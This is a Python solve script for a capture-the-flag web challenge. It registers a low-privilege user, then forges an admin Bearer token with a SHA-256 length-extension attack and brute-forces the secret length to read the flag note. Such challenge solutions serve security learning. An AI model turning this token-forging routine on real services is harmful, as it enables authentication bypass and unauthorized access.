import requests
import json
import hashlib
import hlextend
import base64

# Use a session object
session = requests.Session()
# url = "https://gcpayvzl.web.ctf.uscybergames.com"
url = "https://hutyzile.web.ctf.uscybergames.com"  # Change to your local server if needed

def register(username, password):
    data = {"username": username, "password": password}
    # Use the session for the request
    r = session.post(f"{url}/register", json=data)
    print(r.text)
    return r.text

def login(username, password):
    data = {"username": username, "password": password}
    # Use the session for the request
    r = session.post(f"{url}/login", json=data)
    token = r.json().get("token")
    if token:
        # Set the Authorization header for the session
        session.headers.update({"Authorization": f"Bearer {token}"})
    return token

def get_flag():
    # The Authorization header is now automatically included by the session
    r = session.get(f"{url}/flag")
    return r.text

def list_notes():
    # The Authorization header is now automatically included by the session
    r = session.get(f"{url}/notes")
    return r.json()

def get_note(title):
    # The Authorization header is now automatically included by the session
    r = session.get(f"{url}/notes/{title}")
    print(r.text)
    return r.json()

def create_note(title, text):
    # The Authorization header is now automatically included by the session
    data = {"title": title, "text": text}
    r = session.post(f"{url}/notes", json=data)
    print(r.text)
    return r.json()


# Register a user 'adm'
print(register("adm", "password"))
# Login as 'adm' to get the token
token = login("adm", "password")
if token:
    print(f"Logged in successfully. Token: {token}")
    # flag_content = get_flag() # Uncomment if you have a /flag endpoint and want to call it
    # print(f"Flag content: {flag_content}")
else:
    print("Login failed.")

# Create Note
create_note("test", "This is a test note.")

read_note = get_note("test")


HMAC_HEX_LENGTH = hashlib.sha256().digest_size * 2

token_decoded = base64.b64decode(token)

hl_sha = hlextend.new("sha256")
forged = hl_sha.extend(
    b"in", # appendData
    token_decoded[:-HMAC_HEX_LENGTH], # knownData
    64, # secretLength
    token_decoded[-HMAC_HEX_LENGTH:].decode('utf-8'), # startHash
)

new_token = base64.b64encode(forged + hl_sha.hexdigest().encode())

def forge_token(input_token, append_data, secret_length):
    hl_sha = hlextend.new("sha256")
    forged = hl_sha.extend(
        append_data, # appendData
        input_token[:-HMAC_HEX_LENGTH], # knownData
        secret_length, # secretLength
        input_token[-HMAC_HEX_LENGTH:].decode('utf-8'), # startHash
    )

    new_token = base64.b64encode(forged + hl_sha.hexdigest().encode())
    return new_token

print(f"New forged token: {new_token.decode()}")

for i in range(1, 100):
    print(i)
    new_token = forge_token(token_decoded, b"in", i)
    session.headers.update({"Authorization": f"Bearer {new_token.decode()}"})
    print(list_notes())
    print(get_note("flag"))
